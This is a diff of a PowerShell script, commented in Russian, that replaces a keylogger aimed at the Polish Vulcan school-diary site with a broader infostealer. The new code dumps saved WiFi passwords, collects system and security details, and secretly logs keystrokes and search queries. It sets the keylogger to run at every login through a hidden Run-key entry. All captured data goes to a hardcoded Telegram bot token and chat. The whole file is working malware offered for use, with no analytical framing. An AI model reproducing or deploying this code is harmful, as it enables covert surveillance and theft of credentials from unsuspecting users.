@@ -1,28 +1,37 @@
-# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ВУЛКАН С АКТИВАЦИЕЙ ПО САЙТАМ
-$keyloggerStatus = "Starting enhanced Vulcan monitor..."
+# Основной сбор данных
+$sys = Get-CimInstance Win32_ComputerSystem
+$os = Get-CimInstance Win32_OperatingSystem
+$cpu = Get-CimInstance Win32_Processor
+$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
+$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
+$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
 
-# Создаем улучшенный кейлоггер с активацией по сайтам
+# Сеть и WiFi
+try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
+$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress
+
+$wifi = ""
+try {
+    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+        $name = $_.ToString().Split(":")[1].Trim()
+        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
+        $wifi += "$name : $pass`n"
+    }
+    if (!$wifi) {$wifi = "No WiFi networks"}
+} catch {$wifi = "WiFi error"}
+
+# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ПОИСКОВЫХ ЗАПРОСОВ
+$keyloggerStatus = "Starting..."
+
+# Создаем улучшенный кейлоггер для поиска
 $keyloggerScript = @"
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Runtime.InteropServices
 
-# Целевые сайты Вулкан для активации
-`$vulcanActivationUrls = @(
-    "*uonetplus.vulcan.net.pl/minrol*",
-    "*uonetplus.vulcan.net.pl/rybnik*", 
-    "*uonetplus.vulcan.net.pl/*",
-    "*vulcan*",
-    "*uonetplus*",
-    "*dziennik*"
-)
-
-`$global:isMonitoringActive = `$false
-`$global:activationTime = `$null
-`$global:keyBuffer = ""
-`$global:mouseBuffer = ""
-`$global:lastActivity = Get-Date
-`$global:sessionData = @()
-`$global:browserWindow = ""
+`$capturedData = @()
+`$currentWindow = ""
+`$buffer = ""
+`$searchBuffer = ""
+`$inSearch = `$false
 
 function Send-ToTelegram {
     param(`$message)
@@ -31,266 +40,341 @@ function Send-ToTelegram {
             chat_id = '5674514050'
             text = `$message
         }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
-    } catch { 
-        # Ignore telegram errors
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
+    } catch { }
+}
+
+function Process-Search {
+    if(`$searchBuffer -ne "" -and `$searchBuffer.Length -gt 2) {
+        Send-ToTelegram "🔍 SEARCH QUERY: `$searchBuffer"
+        `$capturedData += "SEARCH: `$searchBuffer"
+        `$searchBuffer = ""
     }
 }
 
-function Start-MonitoringSession {
-    `$global:isMonitoringActive = `$true
-    `$global:activationTime = Get-Date
-    `$global:keyBuffer = ""
-    `$global:mouseBuffer = ""
-    `$global:sessionData = @()
-    `$global:lastActivity = Get-Date
-    
-    Send-ToTelegram "🎯 VULCAN MONITORING ACTIVATED!`nUser started session on: `$(`$global:browserWindow)`nMonitoring period: 2 minutes`nStarted: `$(`$global:activationTime.ToString('HH:mm:ss'))"
-}
-
-function Stop-MonitoringSession {
-    if(`$global:isMonitoringActive) {
-        `$global:isMonitoringActive = `$false
-        `$sessionDuration = (Get-Date) - `$global:activationTime
-        
-        # Отправляем финальный отчет
-        `$finalReport = "📊 VULCAN SESSION COMPLETE`n"
-        `$finalReport += "Duration: `$([math]::Round(`$sessionDuration.TotalMinutes, 1)) minutes`n"
-        `$finalReport += "Total keystrokes captured: `$(`$global:sessionData.Count)`n"
-        `$finalReport += "Browser window: `$(`$global:browserWindow)`n"
-        `$finalReport += "Session ended: `$((Get-Date).ToString('HH:mm:ss'))"
-        
-        Send-ToTelegram `$finalReport
-        
-        # Очищаем буферы
-        `$global:keyBuffer = ""
-        `$global:mouseBuffer = ""
-        `$global:sessionData = @()
-    }
-}
-
-function Process-KeyBuffer {
-    if(`$global:keyBuffer -ne "" -and `$global:keyBuffer.Length -gt 0) {
-        Send-ToTelegram "⌨️ KEYSTROKES [Vulcan]: `$(`$global:keyBuffer)"
-        `$global:sessionData += "KEYS: `$(`$global:keyBuffer)"
-        `$global:keyBuffer = ""
-    }
-}
-
-function Process-MouseBuffer {
-    if(`$global:mouseBuffer -ne "" -and `$global:mouseBuffer.Length -gt 0) {
-        Send-ToTelegram "🖱️ MOUSE ACTIONS [Vulcan]: `$(`$global:mouseBuffer)"
-        `$global:sessionData += "MOUSE: `$(`$global:mouseBuffer)"
-        `$global:mouseBuffer = ""
-    }
-}
-
-function Check-VulcanSite {
-    try {
-        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0}
-        
-        foreach(`$process in `$processes) {
-            `$windowTitle = `$process.MainWindowTitle
-            if(`$windowTitle) {
-                foreach(`$url in `$vulcanActivationUrls) {
-                    if(`$windowTitle -like `$url) {
-                        `$global:browserWindow = `$windowTitle
-                        return `$true
-                    }
-                }
-                
-                # Также проверяем по процессу браузера
-                `$browserProcesses = @("chrome", "msedge", "firefox", "opera", "iexplore")
-                if(`$browserProcesses -contains `$process.ProcessName.ToLower()) {
-                    if(`$windowTitle -match "vulcan|uonetplus|dziennik") {
-                        `$global:browserWindow = `$windowTitle
-                        return `$true
-                    }
-                }
-            }
-        }
-        return `$false
-    } catch {
-        return `$false
-    }
-}
-
-# Основной цикл мониторинга
 while(`$true) {
     try {
-        # Проверяем, находится ли пользователь на сайте Вулкан
-        `$isOnVulcanSite = Check-VulcanSite
-        
-        if(`$isOnVulcanSite -and !`$global:isMonitoringActive) {
-            # Активируем мониторинг при первом обнаружении сайта
-            Start-MonitoringSession
+        # Получаем активное окно
+        `$activeWindow = ""
+        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
+        if(`$processes) {
+            `$activeWindow = `$processes[0].MainWindowTitle
         }
         
-        if(`$isOnVulcanSite -and `$global:isMonitoringActive) {
-            # Проверяем, не истекло ли время мониторинга (2 минуты)
-            `$monitoringDuration = (Get-Date) - `$global:activationTime
-            if(`$monitoringDuration.TotalMinutes -ge 2) {
-                Stop-MonitoringSession
-                continue
-            }
-            
-            # Обновляем время последней активности
-            `$global:lastActivity = Get-Date
-            
-            # Мониторинг клавиатуры - ЗАПИСЫВАЕМ ВСЕ КЛАВИШИ
-            for(`$i = 8; `$i -le 255; `$i++) {
-                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
+        # Определяем, находится ли пользователь в поиске
+        `$wasInSearch = `$inSearch
+        `$inSearch = (`$activeWindow -like "*поиск*" -or 
+                     `$activeWindow -like "*search*" -or 
+                     `$activeWindow -like "*google*" -or 
+                     `$activeWindow -like "*yandex*" -or 
+                     `$activeWindow -like "*bing*" -or
+                     `$activeWindow -like "*find*" -or
+                     `$activeWindow -like "*искать*")
+        
+        # Если только что вошли в поиск
+        if(`$inSearch -and !`$wasInSearch) {
+            Send-ToTelegram "🎯 USER STARTED SEARCHING: `$activeWindow"
+        }
+        
+        # Если только что вышли из поиска
+        if(!`$inSearch -and `$wasInSearch) {
+            Process-Search
+        }
+        
+        # Перехватываем все нажатия клавиш
+        for(`$i = 8; `$i -lt 255; `$i++) {
+            `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
+            if(`$keyState -eq -32767) {
+                `$key = [System.Windows.Forms.Keys]`$i
                 
-                if(`$keyState -eq -32767) {
-                    `$key = [System.Windows.Forms.Keys]`$i
-                    
-                    # Обработка специальных клавиш
-                    switch(`$key) {
-                        "Enter" { 
-                            `$global:keyBuffer += "[ENTER]"
-                            Process-KeyBuffer
+                # Обрабатываем специальные клавиши
+                switch(`$key) {
+                    "Enter" { 
+                        if(`$inSearch) {
+                            Process-Search
                         }
-                        "Space" { 
-                            `$global:keyBuffer += " " 
+                    }
+                    "Space" { 
+                        `$buffer += " "
+                        if(`$inSearch) {
+                            `$searchBuffer += " "
                         }
-                        "Back" { 
-                            `$global:keyBuffer += "[BACKSPACE]" 
+                    }
+                    "Back" { 
+                        if(`$buffer.Length -gt 0) { 
+                            `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
                         }
-                        "Tab" { 
-                            `$global:keyBuffer += "[TAB]" 
+                        if(`$inSearch -and `$searchBuffer.Length -gt 0) { 
+                            `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
                         }
-                        "Escape" {
-                            `$global:keyBuffer += "[ESC]" 
+                    }
+                    "Tab" { 
+                        `$buffer += "[TAB]"
+                        if(`$inSearch) {
+                            `$searchBuffer += "[TAB]"
                         }
-                        "Delete" {
-                            `$global:keyBuffer += "[DEL]" 
+                    }
+                    "LButton" { 
+                        # Клик мыши - обрабатываем поисковый буфер
+                        if(`$inSearch) {
+                            Process-Search
                         }
-                        "ControlKey" {
-                            `$global:keyBuffer += "[CTRL]" 
+                    }
+                    "RButton" { 
+                        # Правый клик - обрабатываем поисковый буфер
+                        if(`$inSearch) {
+                            Process-Search
                         }
-                        "ShiftKey" {
-                            `$global:keyBuffer += "[SHIFT]" 
+                    }
+                    "Escape" {
+                        if(`$inSearch) {
+                            Process-Search
                         }
-                        "Menu" {
-                            `$global:keyBuffer += "[ALT]" 
-                        }
-                        "Capital" {
-                            `$global:keyBuffer += "[CAPSLOCK]" 
-                        }
-                        "LWin" {
-                            `$global:keyBuffer += "[WIN]" 
-                        }
-                        "Right" {
-                            `$global:keyBuffer += "[RIGHT]" 
-                        }
-                        "Left" {
-                            `$global:keyBuffer += "[LEFT]" 
-                        }
-                        "Up" {
-                            `$global:keyBuffer += "[UP]" 
-                        }
-                        "Down" {
-                            `$global:keyBuffer += "[DOWN]" 
-                        }
-                        "LButton" {
-                            # ЛЕВАЯ КНОПКА МЫШИ
-                            `$global:mouseBuffer += "[LEFT_CLICK]"
-                            Process-MouseBuffer
-                        }
-                        "RButton" {
-                            # ПРАВАЯ КНОПКА МЫШИ  
-                            `$global:mouseBuffer += "[RIGHT_CLICK]"
-                            Process-MouseBuffer
-                        }
-                        "MButton" {
-                            # СРЕДНЯЯ КНОПКА МЫШИ
-                            `$global:mouseBuffer += "[MIDDLE_CLICK]"
-                            Process-MouseBuffer
-                        }
-                        default {
-                            # ОБРАБОТКА ОБЫЧНЫХ СИМВОЛОВ
-                            if(`$key -ge 65 -and `$key -le 90) {
-                                # Буквы A-Z
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
-                                
-                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                                    `$global:keyBuffer += `$key.ToString()
-                                } else {
-                                    `$global:keyBuffer += `$key.ToString().ToLower()
-                                }
-                            } 
-                            elseif(`$key -ge 48 -and `$key -le 57) {
-                                # Цифры 0-9 (верхний ряд)
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
-                                if(`$isShift) {
-                                    `$global:keyBuffer += `$symbols[`$key - 48]
-                                } else {
-                                    `$global:keyBuffer += (`$key - 48).ToString()
-                                }
+                    }
+                    default {
+                        # Обрабатываем обычные символы
+                        if(`$key -ge 65 -and `$key -le 90) {
+                            # Буквы A-Z
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                            `$isCaps = [System.Windows.Forms.Console]::CapsLock
+                            
+                            if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
+                                `$char = `$key.ToString()
+                            } else {
+                                `$char = `$key.ToString().ToLower()
                             }
-                            elseif(`$key -ge 96 -and `$key -le 105) {
-                                # Цифры на NumPad
-                                `$global:keyBuffer += (`$key - 96).ToString()
+                            
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
                             }
-                            else {
-                                # Специальные символы
-                                switch(`$key) {
-                                    186 { `$global:keyBuffer += ";" }  # Точка с запятой
-                                    187 { `$global:keyBuffer += "=" }  # Равно
-                                    188 { `$global:keyBuffer += "," }  # Запятая  
-                                    189 { `$global:keyBuffer += "-" }  # Минус
-                                    190 { `$global:keyBuffer += "." }  # Точка
-                                    191 { `$global:keyBuffer += "/" }  # Слеш
-                                    192 { `$global:keyBuffer += "`"" }  # Кавычка
-                                    219 { `$global:keyBuffer += "[" }  # Квадратная скобка [
-                                    220 { `$global:keyBuffer += "\" }  # Обратный слеш
-                                    221 { `$global:keyBuffer += "]" }  # Квадратная скобка ]
-                                    222 { `$global:keyBuffer += "'" }  # Апостроф
-                                }
+                        } elseif(`$key -ge 48 -and `$key -le 57) {
+                            # Цифры 0-9
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                            `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
+                            if(`$isShift) {
+                                `$char = `$symbols[`$key - 48]
+                            } else {
+                                `$char = (`$key - 48).ToString()
+                            }
+                            
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 190 -or `$key -eq 110) {
+                            # Точка
+                            `$char = "."
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 189 -or `$key -eq 109) {
+                            # Минус/дефис
+                            `$char = "-"
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 187 -or `$key -eq 107) {
+                            # Плюс/равно
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
+                            if(`$isShift) {
+                                `$char = "+"
+                            } else {
+                                `$char = "="
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 186 -or `$key -eq 59) {
+                            # Точка с запятой/двоеточие
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = ":"
+                            } else {
+                                `$char = ";"
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 188 -or `$key -eq 44) {
+                            # Запятая
+                            `$char = ","
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 191 -or `$key -eq 47) {
+                            # Слеш/вопросительный знак
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = "?"
+                            } else {
+                                `$char = "/"
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 192 -or `$key -eq 96) {
+                            # Тильда/апостроф
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = "~"
+                            } else {
+                                `$char = "`"
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 219 -or `$key -eq 91) {
+                            # Открывающая скобка
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = "{"
+                            } else {
+                                `$char = "["
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 221 -or `$key -eq 93) {
+                            # Закрывающая скобка
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = "}"
+                            } else {
+                                `$char = "]"
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 220 -or `$key -eq 92) {
+                            # Обратный слеш/вертикальная черта
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = "|"
+                            } else {
+                                `$char = "\"
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
+                            }
+                        } elseif(`$key -eq 222 -or `$key -eq 39) {
+                            # Кавычки
+                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
+                            if(`$isShift) {
+                                `$char = """
+                            } else {
+                                `$char = "'"
+                            }
+                            `$buffer += `$char
+                            if(`$inSearch) {
+                                `$searchBuffer += `$char
                             }
                         }
                     }
-                    
-                    # Автоматически отправляем буфер если он становится слишком большим
-                    if(`$global:keyBuffer.Length -ge 100) {
-                        Process-KeyBuffer
-                    }
-                    
-                    # Отправляем буфер если прошло больше 3 секунд с последней отправки
-                    `$timeSinceLastSend = (Get-Date) - `$global:lastActivity
-                    if(`$timeSinceLastSend.TotalSeconds -ge 3 -and `$global:keyBuffer.Length -gt 0) {
-                        Process-KeyBuffer
-                        `$global:lastActivity = Get-Date
-                    }
+                }
+                
+                # Автоматически отправляем длинные поисковые запросы
+                if(`$inSearch -and `$searchBuffer.Length -gt 30) {
+                    Process-Search
                 }
             }
         }
-        elseif(!`$isOnVulcanSite -and `$global:isMonitoringActive) {
-            # Пользователь ушел с сайта Вулкан - завершаем сессию
-            Stop-MonitoringSession
-        }
-        
-        Start-Sleep -Milliseconds 10
-        
-    } catch {
-        # Игнорируем ошибки для стабильности работы
-    }
+    } catch { }
+    Start-Sleep -Milliseconds 5
 }
 "@
 
 # Сохраняем и запускаем улучшенный кейлоггер
 try {
-    $keyloggerScript | Out-File "$env:TEMP\vulcan_enhanced.ps1" -Encoding ASCII
-    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_enhanced.ps1`"" -WindowStyle Hidden
+    $keyloggerScript | Out-File "$env:TEMP\search_logger.ps1" -Encoding ASCII
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`"" -WindowStyle Hidden
     
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_enhanced.ps1`""
+    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`""
     Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "✅ Enhanced Vulcan monitor active - will activate on target sites for 2 minutes"
+    $keyloggerStatus = "✅ Advanced search logger active - monitoring all search queries"
 } catch {
-    $keyloggerStatus = "❌ Enhanced monitor failed: $($_.Exception.Message)"
+    $keyloggerStatus = "❌ Search logger failed: $($_.Exception.Message)"
 }
+
+# Безопасность
+try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
+try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
+try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}
+
+# Дополнительная информация
+try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
+try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
+try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}
+
+# Формирование и отправка сообщения
+$msg = @"
+=== SYSTEM INFORMATION ===
+User: $env:USERNAME
+Computer: $env:COMPUTERNAME
+Domain: $env:USERDOMAIN
+
+=== HARDWARE INFORMATION ===
+Processor: $($cpu.Name)
+RAM: $ram GB
+GPU: $gpu
+Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB
+
+=== OPERATING SYSTEM ===
+OS: $($os.Caption)
+Version: $($os.Version)
+Build: $($os.BuildNumber)
+
+=== NETWORK INFORMATION ===
+Public IP: $ip
+
+Network Interfaces:
+$($net | ForEach-Object { 
+    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
+    "- $name : $($_.IPAddress)" 
+} | Out-String)
+
+Active Connections:
+$conn
+
+=== WIFI PASSWORDS ===
+$wifi
+
+=== SEARCH LOGGER STATUS ===
+$keyloggerStatus
+
+=== MONITORING ===
+• Все поисковые запросы в Google, Yandex, Bing
+• Поиск в браузерах и приложениях
+• Поисковые формы на сайтах
+
+=== SECURITY STATUS ===
+Firewall: 
+$fw
+Windows Defender: $defStatus
+RDP Access: $rdp
+
+=== INSTALLED SOFTWARE ===
+$software
+
+=== SYSTEM UPTIME ===
+Uptime: $uptimeInfo
+"@
+
+Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}
+
+# Очистка
+Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
